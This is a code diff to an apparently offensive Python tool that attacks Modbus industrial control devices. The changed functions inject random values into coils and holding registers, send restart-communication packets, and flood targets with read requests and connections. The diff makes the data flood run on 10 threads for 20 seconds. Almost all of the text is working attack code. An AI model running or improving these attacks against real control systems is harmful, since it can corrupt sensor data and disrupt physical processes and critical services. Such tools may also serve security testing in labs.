@@ -8,8 +8,8 @@
 import nmap
 import random
 import numpy as np
-from time import sleep
-from threading import Thread
+import time
+from threading import Thread, Event
 from pymodbus.client.sync import ModbusTcpClient, ModbusSerialClient
 from pymodbus.mei_message import ReadDeviceInformationRequest
 from pymodbus.pdu import ModbusRequest, ExceptionResponse
@@ -205,7 +205,7 @@ def naive_sensor_read(ip_addresses):
         hr_found = []
 
         for _ in range(10):
-            sleep(1)
+            time.sleep(1)
             coil = client.read_coils(0, 2000).bits
             di = client.read_discrete_inputs(0, 2000).bits
             ir = client.read_input_registers(0, 125).registers
@@ -272,7 +272,7 @@ def sporadic_sensor_measurement_injection(ip_addresses):
 
         # affect coils
         for _ in range(100):
-            sleep(0.05)
+            time.sleep(0.05)
             coil_value = random.choice([True, False])
 
             for address in co_addresses:
@@ -280,13 +280,14 @@ def sporadic_sensor_measurement_injection(ip_addresses):
 
         # affect holding registers
         for _ in range(100):
-            sleep(0.05)
+            time.sleep(0.05)
             hr_value = random.randint(0, 65535)
             for address in hr_addresses:
                 client.write_register(address-1, hr_value)
         
         client.close()
     print("### SPORADIC SENSOR MEASUREMENT INJECTION FINSIH ###")
+
 
 
 # Function: force_listen_mode
@@ -346,7 +347,7 @@ def restart_communication(ip_addresses):
                 print(f"Unsuccessful attack: {client.last_except} - {client.last_except_as_full_txt}")
             else:
                 print(f"Successful attack! Sent Restart Communication packet")
-            sleep(3)
+            time.sleep(3)
         client.close()
             
     print("### RESTART COMMUNICATION FINISH ###")
@@ -356,16 +357,14 @@ def restart_communication(ip_addresses):
 # Function: data_flood_attack
 # Purpose: Floods packets of random read requests to the devices
 def data_flood_attack(ip_addresses):
-    global stop_looping
     print("### DATA FLOOD ATTACK ###")
 
     # helper function to flood packets
-    def _flood(ip):
-        global stop_looping
+    def _flood(ip, stop_looping):
 
         client = ModbusTcpClient(host=ip, port=502)
         client.connect()
-        while not stop_looping:
+        while not stop_looping.is_set():
             # select random read function code + random address + random num of registers to read
             func_code = random.choice([1, 2, 3, 4])
             address = random.randint(0, 100)
@@ -382,18 +381,15 @@ def data_flood_attack(ip_addresses):
                 client.read_input_registers(address=address, count=num_values)
 
     for ip in ip_addresses:
-        print(f"Flooding {ip} with random packets from 10 threads for 30 seconds")
+        print(f"Flooding {ip} with random packets from 10 threads for 20 seconds")
 
-        stop_looping = False
-        th_stopper = Thread(target=_check_for_enter)
-        th_stopper.start()
-
-        for _ in range(1):
-            th_flooder = Thread(target=_flood, args=(ip,))
+        stop_looping = Event()
+        for _ in range(10):
+            th_flooder = Thread(target=_flood, args=(ip, stop_looping))
             th_flooder.start()
 
-        while not stop_looping:
-            pass # block
+        time.sleep(20)
+        stop_looping.set()
 
     print("### DATA FLOOD ATTACK FINISH ###")
 
@@ -413,7 +409,7 @@ def connection_flood_attack(ip_addresses):
             client = ModbusTcpClient(host=ip, port=502)
             client.connect()
             #client = ModbusClient(host=ip, port=502)
-            sleep(0.01)
+            time.sleep(0.01)
             client.close()
 
     for ip in ip_addresses:
